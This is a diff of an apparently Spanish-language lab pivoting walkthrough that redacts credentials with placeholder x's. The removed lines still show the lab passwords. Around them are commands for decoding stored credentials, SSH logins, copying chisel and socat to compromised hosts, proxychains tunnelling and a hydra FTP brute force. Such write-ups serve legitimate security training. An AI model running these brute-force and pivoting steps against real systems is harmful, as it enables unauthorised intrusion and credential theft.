@@ -140,22 +140,22 @@ echo 'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJ
 ahora tenemos esto que esta codeado en hexadecimal, asi que convertimos a ascii
 
 echo '50 30 73 65 69 64 f3 6e 32 30 32 32 21' |xxd -r -p
-P0seid�n2022!
+xxxxxxxxxxxxx
 
 como mi terminal no esta interpretando el caracter, lo decodifico desde internet, aunque imagino trata solo de una "o" acentuada
 
->>>> P0seidón2022!
+>>>> xxxxxxxxxxxxx
 
 ahora la misma nota que contiene la password tambien indica el user: cerbero el perro de 3 cabezas: user= cerbero
 
 credenciales:
 
-cerbero:P0seidón2022!
+xxxxxxxxxxxxx:xxxxxxxxxxxxx
 
 # Puerto 22 ssh
 
 ssh cerbero@10.10.10.2
-pass:P0seidón2022!
+pass:xxxxxxxxxxxxx
 
 sudo -l
 
@@ -179,7 +179,7 @@ para realizar un reconocimento de host en la otra red
 desde mi maquina atacante:
 
 scp scanip.sh cerbero@10.10.10.2:/home/cerbero
-pass: P0seidón2022!
+pass: xxxxxxxxxxxxx
 
 ---------------------------------------------------------------------------
 
@@ -195,7 +195,7 @@ existe un host mas activo.. asi que hare un port forwarding con chisel,
 asi que me lo comparto desde mi maquina atacante....
 
 scp chisel cerbero@10.10.10.2:/home/cerbero
-pass:P0seidón2022!
+pass:xxxxxxxxxxxxx
 
 ahora ejecuto chisel en mi maquina atacante y en el host 10.10.10.2
 
@@ -490,14 +490,14 @@ echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' 
 ahora nos arroja una cadena en hexadecimal
 
 echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' |base32 -d |base64 -d |xxd -r -p
-Templ02019!
+xxxxxxxxxxxxx
 
-asi que la password del user megalodon es: Templ02019!
+asi que la password del user megalodon es: xxxxxxxxxxxxx
 
 las pruebo contra el servicio ssh del host 20.20.20.3
 
 proxychains4 ssh megalodon@20.20.20.3 2>/dev/null 
-pass:Templ02019!
+pass:xxxxxxxxxxxxx
 
 # Acceso al host 20.20.20.3
 
@@ -539,7 +539,7 @@ enviare el mismo script que envie a la primera maquina para detectar host en la 
 desde mi maquina atacante:
 
 proxychains4 scp scanip.sh megalodon@20.20.20.3:/home/megalodon 2>/dev/null
-pass: Templ02019!
+pass: xxxxxxxxxxxxx
 
 ------------------------------------------------------------------------------------
 
@@ -560,10 +560,10 @@ y chisel al host 20.20.20.3
 desde mi maquina atacante:
 
 proxychains4 scp chisel megalodon@20.20.20.3:/home/megalodon 2>/dev/null
-pass:Templ02019!
+pass:xxxxxxxxxxxxx
 
 proxychains4 scp socat cerbero@10.10.10.2:/home/cerbero 2>/dev/null
-pass:P0seidón2022!
+pass:xxxxxxxxxxxxx
 
 -------------------------------------------------------------------------------------
 
@@ -671,7 +671,7 @@ que probare con estos user's por el servicio ftp
 
 proxychains4 hydra -l hercules -P /usr/share/wordlists/rockyou.txt ftp://30.30.30.3 2>/dev/null
 
-[21][ftp] host: 30.30.30.3   login: hercules   password: thunder1
+[21][ftp] host: 30.30.30.3   login: hercules   password: xxxxxxxxxxxxx
 
 me conecto via ftp
 
@@ -706,13 +706,13 @@ AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=
 y me consigo con una cadena en base64
 
 echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' |base64 -d
-electrocut4c10n!
+xxxxxxxxxxxxx
 
 parece ser una password pero la probe contra el servicio smb y ssh con el user hercules pero 
 sin resultados, asi que pruebo con el user rayito y obtengo resultados por ssh
 
 proxychains4 ssh rayito@30.30.30.3
-pass:electrocut4c10n!
+pass:xxxxxxxxxxxxx
 
 sudo -l
 
